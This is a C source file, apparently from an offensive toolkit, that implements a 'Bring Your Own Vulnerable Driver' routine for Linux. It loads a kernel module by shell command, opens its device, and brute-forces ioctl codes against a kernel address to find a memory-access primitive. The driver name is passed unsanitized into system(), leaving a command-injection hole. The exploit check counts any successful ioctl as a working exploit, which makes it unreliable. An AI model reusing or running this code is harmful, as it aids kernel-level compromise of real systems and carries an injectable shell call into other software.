/* BYOVD - Bring Your Own Vulnerable Driver operations for Linux */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

typedef struct {
    int handle;
    int fd;
    char driver_name[256];
} byovd_context_t;

static byovd_context_t* g_byovd = NULL;

int jocky_byovd_new(void) {
    if (g_byovd) return 1;  /* Already allocated */

    g_byovd = malloc(sizeof(byovd_context_t));
    if (!g_byovd) return -1;

    memset(g_byovd, 0, sizeof(byovd_context_t));
    g_byovd->handle = -1;
    g_byovd->fd = -1;

    return 1;
}

int jocky_byovd_load(const char* driver) {
    if (!g_byovd || !driver) return -1;

    /* Try to load vulnerable driver */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "modprobe %s 2>/dev/null || insmod %s 2>/dev/null", driver, driver);

    if (system(cmd) != 0) {
        return -1;
    }

    /* Attempt to open driver device */
    char device_path[256];
    snprintf(device_path, sizeof(device_path), "/dev/%s", driver);

    g_byovd->fd = open(device_path, O_RDWR);
    if (g_byovd->fd < 0) {
        /* Try /sys/bus/pci/drivers path */
        snprintf(device_path, sizeof(device_path), "/sys/bus/pci/drivers/%s", driver);
        g_byovd->fd = open(device_path, O_RDONLY);
        if (g_byovd->fd < 0) {
            return -1;
        }
    }

    strncpy(g_byovd->driver_name, driver, sizeof(g_byovd->driver_name) - 1);
    g_byovd->handle = 1;  /* Mark as loaded */

    return 1;
}

int jocky_byovd_unload(int handle) {
    if (!g_byovd || handle != g_byovd->handle) return -1;

    if (g_byovd->fd >= 0) {
        close(g_byovd->fd);
        g_byovd->fd = -1;
    }

    /* Attempt to unload the driver */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "modprobe -r %s 2>/dev/null || rmmod %s 2>/dev/null",
             g_byovd->driver_name, g_byovd->driver_name);
    system(cmd);

    return 0;
}

int jocky_byovd_destroy(int handle) {
    if (!g_byovd) return -1;

    jocky_byovd_unload(handle);

    free(g_byovd);
    g_byovd = NULL;

    return 0;
}

int byovd_test_exploit(int handle) {
    if (!g_byovd || handle != g_byovd->handle || g_byovd->fd < 0) {
        return -1;
    }

    /* Test if the driver allows memory access via ioctl */
    /* Generic test - try to read a single byte from a high kernel address */
    unsigned long test_addr = 0xffffffff80000000UL;  /* Kernel space */
    char dummy;

    /* Try a generic read ioctl - different drivers use different numbers */
    for (unsigned int ioctl_cmd = 0x4000; ioctl_cmd < 0x5000; ioctl_cmd += 4) {
        if (ioctl(g_byovd->fd, ioctl_cmd, &test_addr) == 0) {
            return 0;  /* Exploit works */
        }
    }

    return -1;  /* No working exploit found */
}
